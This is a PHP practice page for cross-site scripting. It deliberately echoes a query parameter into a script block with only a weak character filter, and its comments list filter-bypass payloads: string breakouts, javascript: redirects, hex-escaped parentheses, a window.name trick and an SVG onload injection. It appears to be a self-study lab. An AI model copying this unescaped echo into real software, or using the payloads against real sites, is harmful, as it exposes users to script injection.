<?php

    $xss = "";
    if(isset($_GET["xss"])) {
        $xss = $_GET["xss"];
    }
    $xss = preg_replace('/([\(\)`\'])/', '', $xss);
    // injection example: ");alert(document.domin);//
    // but it will not work due to prge_replace is replacing all parentheses

    // alert `1` - same as alert(1)
    // redirection examples:
    //      window.location="/asd"
    //      window.location="https://hextree.io"
    //      window.location="javascript:alert(document.domain)" -> will call alert function but not redirection

    // injection example 2: ",window.location="https://hextree.io
    // injection example 3: ",location="javascript:alert(1)
    // injection example 3: ",location="javascript:alert\x281\x29

    // Final idea
    // injection: x(""+{a:location=name}+"")
    // we are creating an object with parameter (a)
    // after object is assigned par. a will be called

    // window.open('/','name(any)') - creates new tab wit name - name(any)
    // window.name or just name will display created name
    // finally we can xss from anywhere
    // example
    // w = window.open('/?xss=",location=name,"', 'javascript:alert(1)')

    // another additional idea
    // </script><svg onload="location=name">
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS TEST</title>

    <script>
        function x(a, b) {
            console.log(`1. ${a}`);
            console.log(`2. ${b}`);
        }

        x("a", "<?= $xss ?>");
    </script>

</head>
<body>
    <form action="">
        <input type="text" name="xss" placeholder="xss">
        <input type="submit" value="Submit">
    </form>
    <div id="test">liveoverflow</div> <!-- div will accesible from window.test -->
</body>
</html>